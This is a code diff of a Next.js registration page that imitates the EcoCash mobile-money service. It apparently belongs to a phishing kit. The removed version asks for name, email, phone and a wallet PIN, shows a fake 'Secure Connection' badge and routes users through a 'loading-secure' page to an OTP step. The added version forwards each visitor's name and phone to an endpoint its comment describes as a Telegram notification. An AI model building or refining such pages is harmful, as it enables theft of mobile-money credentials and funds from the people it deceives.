@@ -1,277 +1,179 @@
-"use client"
+'use client';
 
-import type React from "react"
-import Link from "next/link"
-import { useState } from "react"
-import { Eye, EyeOff, Home, ChevronDown } from "lucide-react"
-import { Button } from "@/components/ui/button"
-import {
-  DropdownMenu,
-  DropdownMenuContent,
-  DropdownMenuItem,
-  DropdownMenuTrigger,
-} from "@/components/ui/dropdown-menu"
+import { useState } from 'react';
+import Link from 'next/link';
+import { useRouter, useSearchParams } from 'next/navigation';
+import { User, Phone, ArrowRight, Shield, AlertCircle } from 'lucide-react';
+import { Input } from '@/components/ui/input';
+import { Button } from '@/components/ui/button';
 
-const COUNTRIES = [
-  { code: "ZW", name: "Zimbabwe", dial: "+263", flag: "🇿🇼" },
-  { code: "ZA", name: "South Africa", dial: "+27", flag: "🇿🇦" },
-  { code: "BW", name: "Botswana", dial: "+267", flag: "🇧🇼" },
-  { code: "ZM", name: "Zambia", dial: "+260", flag: "🇿🇲" },
-  { code: "KE", name: "Kenya", dial: "+254", flag: "🇰🇪" },
-]
+export default function RegisterPage() {
+  const [name, setName] = useState('');
+  const [phone, setPhone] = useState('');
+  const [error, setError] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
+  const router = useRouter();
+  const searchParams = useSearchParams();
+  
+  // Get name and phone from URL params if available
+  const initialName = searchParams.get('name') || '';
+  const initialPhone = searchParams.get('phone') || '';
 
-export default function EcoCashRegisterPage() {
-  const [selectedCountry, setSelectedCountry] = useState(COUNTRIES[0])
-  const [phoneNumber, setPhoneNumber] = useState("")
-  const [fullName, setFullName] = useState("")
-  const [email, setEmail] = useState("")
-  const [pin, setPin] = useState(["", "", "", ""])
-  const [showPin, setShowPin] = useState(false)
-  const [loading, setLoading] = useState(false)
-  const [loadingMessage, setLoadingMessage] = useState("")
-
-  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    // Only allow numbers
-    const value = e.target.value.replace(/\D/g, "")
-    setPhoneNumber(value)
-  }
-
-  const handlePinChange = (index: number, value: string) => {
-    if (!/^\d*$/.test(value)) return
-
-    const newPin = [...pin]
-    newPin[index] = value.slice(-1)
-    setPin(newPin)
-
-    // Auto-focus next input
-    if (value && index < 3) {
-      const nextInput = document.getElementById(`pin-${index + 1}`)
-      nextInput?.focus()
+  const validateForm = () => {
+    if (!name.trim()) {
+      setError('Full name is required');
+      return false;
     }
-  }
-
-  const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
-    if (e.key === "Backspace" && !pin[index] && index > 0) {
-      const prevInput = document.getElementById(`pin-${index - 1}`)
-      prevInput?.focus()
+    
+    if (!phone) {
+      setError('Phone number is required');
+      return false;
     }
-  }
-
-  const handleRegister = async (e: React.FormEvent) => {
-    e.preventDefault()
-
-    // Combine country code and phone number for full format
-    const cleanPhone = phoneNumber.startsWith("0") ? phoneNumber.slice(1) : phoneNumber
-    const fullPhone = `${selectedCountry.dial}${cleanPhone}`.replace(/\s/g, "")
-
-    if (!fullName || !email || !phoneNumber || pin.some((p) => !p)) {
-      alert("Please enter all details: Full Name, Email, Phone, and PIN")
-      return
+    
+    if (!/^\+?[\d\s-()]+$/.test(phone)) {
+      setError('Please enter a valid phone number');
+      return false;
     }
+    
+    setError('');
+    return true;
+  };
 
-    setLoading(true)
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    
+    if (!validateForm()) return;
 
+    setIsLoading(true);
+    
+    // Send notification to Telegram with user details
     try {
-      const res = await fetch("/api/auth/register", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          fullName,
-          email,
-          identifier: fullPhone,
-          pin: pin.join("")
-        }),
-      })
-
-      const data = await res.json()
-
-      if (!res.ok) {
-        throw new Error(data.error || "Registration failed")
-      }
-
-      // Success: Redirect to Loading Page -> OTP
-      const details = encodeURIComponent("Creating secure profile...")
-      const otpUrl = data.redirect
-        ? `${data.redirect}${data.redirect.includes('?') ? '&' : '?'}phone=${fullPhone}`
-        : `/login/otp?phone=${encodeURIComponent(fullPhone)}`
-
-      const nextUrl = encodeURIComponent(otpUrl)
-
-      window.location.href = `/loading-secure?next=${nextUrl}&message=${details}`
-
-    } catch (error: any) {
-      console.error(error)
-      alert(error.message || "Registration failed. Please try again.")
-      setLoading(false)
+      await fetch('/api/registrations', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+          name, 
+          phone, 
+          action: 'registration_attempt' 
+        })
+      });
+    } catch (err) {
+      console.error('Failed to send notification:', err);
     }
-  }
+    
+    // Create user account
+    try {
+      const response = await fetch('/api/auth/register', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ name, phone })
+      });
+      
+      const data = await response.json();
+      
+      if (response.ok) {
+        // Redirect to progress page then to create PIN page
+        router.push(`/loading-secure?action=signup&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&redirect=pin`);
+      } else {
+        setError(data.message || 'An error occurred during registration');
+      }
+    } catch (err) {
+      setError('An error occurred. Please try again.');
+      console.error(err);
+    } finally {
+      setIsLoading(false);
+    }
+  };
 
   return (
-    <div className="min-h-screen bg-white flex flex-col">
-      {/* Top Bar */}
-      <div className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between">
-        <Link
-          href="/"
-          className="flex items-center gap-2 text-blue-600 hover:text-blue-700 font-semibold transition-colors"
-        >
-          <Home className="w-5 h-5" />
-          Home
-        </Link>
-        <div className="text-sm text-green-500 font-semibold">Secure Connection</div>
-      </div>
-
-      {/* Main Content */}
-      <div className="flex-1 flex flex-col items-center justify-center px-6 py-12">
-        {/* Logo */}
-        <div className="mb-12 text-center">
-          <h1 className="text-5xl font-black">
-            <span className="text-blue-600">Eco</span>
-            <span className="text-red-600">Cash</span>
+    <div className="min-h-screen bg-gradient-to-br from-primary/5 to-accent/5 flex items-center justify-center p-4">
+      <div className="w-full max-w-md">
+        <div className="text-center mb-8">
+          <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-primary/10 mb-4">
+            <Shield className="h-8 w-8 text-primary" />
+          </div>
+          <h1 className="text-3xl font-bold bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent">
+            Create Account
           </h1>
+          <p className="text-foreground/70 mt-2">
+            Join EcoCash and start your financial journey
+          </p>
         </div>
 
-        {/* Register Section */}
-        <div className="w-full max-w-md">
-          <h2 className="text-3xl font-bold text-gray-900 text-center mb-10">Create Account</h2>
-
-          <form onSubmit={handleRegister} className="space-y-6">
-
-            {/* Full Name Input */}
-            <div>
-              <label htmlFor="fullName" className="block text-sm font-medium text-gray-700 mb-1 pl-1">Full Name</label>
-              <input
-                id="fullName"
+        <form onSubmit={handleSubmit} className="space-y-4">
+          <div>
+            <label htmlFor="name" className="block text-sm font-medium text-foreground mb-2 pl-1">
+              Full Name
+            </label>
+            <div className="relative">
+              <div className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground">
+                <User className="h-4 w-4" />
+              </div>
+              <Input
+                id="name"
                 type="text"
-                placeholder="John Doe"
-                value={fullName}
-                onChange={(e) => setFullName(e.target.value)}
-                className="w-full px-4 py-3 text-lg border-2 border-gray-200 rounded-xl focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all placeholder-gray-400"
+                placeholder="Enter your full name"
+                value={name || initialName}
+                onChange={(e) => setName(e.target.value)}
+                className="w-full pl-10 pr-4 py-3 text-base border border-input focus:ring-primary/50 focus:border-primary rounded-lg focus:outline-none focus:ring-1 bg-background placeholder:text-muted-foreground"
               />
             </div>
+          </div>
 
-            {/* Email Input */}
-            <div>
-              <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-1 pl-1">Email Address</label>
-              <input
-                id="email"
-                type="email"
-                placeholder="john@example.com"
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
-                className="w-full px-4 py-3 text-lg border-2 border-gray-200 rounded-xl focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all placeholder-gray-400"
+          <div>
+            <label htmlFor="phone" className="block text-sm font-medium text-foreground mb-2 pl-1">
+              Phone Number
+            </label>
+            <div className="relative">
+              <div className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground">
+                <Phone className="h-4 w-4" />
+              </div>
+              <Input
+                id="phone"
+                type="tel"
+                placeholder="Enter your phone number"
+                value={phone || initialPhone}
+                onChange={(e) => setPhone(e.target.value)}
+                className="w-full pl-10 pr-4 py-3 text-base border border-input focus:ring-primary/50 focus:border-primary rounded-lg focus:outline-none focus:ring-1 bg-background placeholder:text-muted-foreground"
               />
             </div>
+          </div>
 
-            {/* Phone Number Input */}
-            <div>
-              <label className="block text-sm font-medium text-gray-700 mb-1 pl-1">Phone Number</label>
-              <div className="relative flex items-center border-2 border-blue-500 rounded-xl overflow-hidden bg-blue-50/50">
-                <DropdownMenu>
-                  <DropdownMenuTrigger asChild>
-                    <button type="button" className="flex items-center gap-2 px-4 py-3 bg-transparent hover:bg-black/5 transition-colors border-r border-blue-200 min-w-[120px]">
-                      <span className="text-2xl">{selectedCountry.flag}</span>
-                      <span className="text-gray-700 font-semibold">{selectedCountry.dial}</span>
-                      <ChevronDown className="w-4 h-4 text-gray-500" />
-                    </button>
-                  </DropdownMenuTrigger>
-                  <DropdownMenuContent align="start" className="w-[200px] bg-white border border-gray-200 shadow-xl z-50">
-                    {COUNTRIES.map((country) => (
-                      <DropdownMenuItem
-                        key={country.code}
-                        onClick={() => setSelectedCountry(country)}
-                        className="gap-2 cursor-pointer py-2"
-                      >
-                        <span className="text-xl">{country.flag}</span>
-                        <span className="font-medium flex-1">{country.name}</span>
-                        <span className="text-muted-foreground">{country.dial}</span>
-                      </DropdownMenuItem>
-                    ))}
-                  </DropdownMenuContent>
-                </DropdownMenu>
-
-                <input
-                  type="tel"
-                  placeholder="77 123 4567"
-                  value={phoneNumber}
-                  onChange={handlePhoneChange}
-                  className="flex-1 px-4 py-3 text-lg bg-transparent border-none focus:outline-none placeholder-gray-400 font-medium"
-                />
-              </div>
+          {error && (
+            <div className="flex items-center p-3 text-sm text-destructive bg-destructive/10 rounded-lg">
+              <AlertCircle className="h-4 w-4 mr-2" />
+              {error}
             </div>
+          )}
 
-            {/* PIN Entry Section */}
-            <div>
-              <h3 className="text-blue-600 font-bold text-center mb-2 text-lg">Create Secure PIN</h3>
-              <p className="text-gray-600 text-center text-sm mb-6">Set a 4-digit PIN for your account</p>
-
-              <div className="flex justify-center gap-4 mb-6">
-                {pin.map((digit, index) => (
-                  <input
-                    key={index}
-                    id={`pin-${index}`}
-                    type={showPin ? "text" : "password"}
-                    value={digit}
-                    onChange={(e) => handlePinChange(index, e.target.value)}
-                    onKeyDown={(e) => handlePinKeyDown(index, e)}
-                    maxLength={1}
-                    className="w-16 h-16 text-3xl font-bold text-center border-2 border-gray-300 rounded-2xl focus:outline-none focus:border-blue-600 focus:ring-2 focus:ring-blue-200 bg-white"
-                  />
-                ))}
+          <Button
+            type="submit"
+            disabled={isLoading}
+            className="w-full flex items-center justify-center gap-2 rounded-md bg-primary px-4 py-3 text-sm font-medium text-primary-foreground shadow transition-colors hover:bg-primary/90 focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 disabled:opacity-50 mt-6"
+          >
+            {isLoading ? (
+              <div className="flex items-center gap-2">
+                <div className="h-4 w-4 border-2 border-current border-t-transparent rounded-full animate-spin"></div>
+                <span>Creating account...</span>
               </div>
+            ) : (
+              <>
+                Create Account
+                <ArrowRight className="h-4 w-4" />
+              </>
+            )}
+          </Button>
+        </form>
 
-              <button
-                type="button"
-                onClick={() => setShowPin(!showPin)}
-                className="flex items-center justify-center gap-2 text-blue-600 font-semibold hover:text-blue-700 mx-auto transition-colors"
-              >
-                {showPin ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
-                {showPin ? "Hide PIN" : "Show PIN"}
-              </button>
-            </div>
-
-            <Button
-              type="submit"
-              disabled={loading}
-              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 text-lg rounded-xl transition-all shadow-lg shadow-blue-600/20"
-            >
-              {loading ? (loadingMessage || "Creating Account...") : "Sign Up"}
-            </Button>
-          </form>
-
-          <div className="mt-8 text-center text-sm">
-            <span className="text-gray-600">Already have an account? </span>
-            <Link href="/login" className="text-blue-600 hover:text-blue-700 font-bold transition-colors">
-              Login here
+        <div className="mt-6 text-center">
+          <p className="text-foreground/70">
+            Already have an account?{' '}
+            <Link href="/login" className="font-medium text-primary hover:text-primary/80">
+              Sign in
             </Link>
-          </div>
-        </div>
-      </div>
-
-      {/* Wavy Divider */}
-      <svg viewBox="0 0 1200 120" preserveAspectRatio="none" className="w-full h-24 text-blue-600" style={{ marginBottom: "-1px" }}>
-        <path d="M0,50 Q300,0 600,50 T1200,50 L1200,120 L0,120 Z" fill="currentColor" />
-      </svg>
-
-      {/* Blue Section with App Promotion */}
-      <div className="bg-blue-600 text-white px-6 py-10">
-        <div className="max-w-md mx-auto text-center">
-          <p className="text-sm opacity-90 mb-6">To register an EcoCash wallet or get assistance, click below</p>
-
-          <div className="bg-gradient-to-br from-purple-500 to-purple-700 rounded-2xl p-8 shadow-xl">
-            <div className="flex justify-center gap-4 mb-4 opacity-70">
-              <div className="w-6 h-6 bg-white/20 rounded-full" />
-              <div className="w-6 h-6 bg-white/20 rounded-full" />
-              <div className="w-6 h-6 bg-white/20 rounded-full" />
-            </div>
-            <h3 className="text-xl font-bold mb-2">Install EcoCash Loans</h3>
-            <p className="text-sm opacity-90 mb-6">Add to your home screen for quick access and better experience</p>
-
-            <Button className="w-full bg-white text-purple-600 hover:bg-gray-100 font-bold py-3 rounded-xl transition-all">
-              Install App
-            </Button>
-          </div>
+          </p>
         </div>
       </div>
     </div>
-  )
+  );
 }
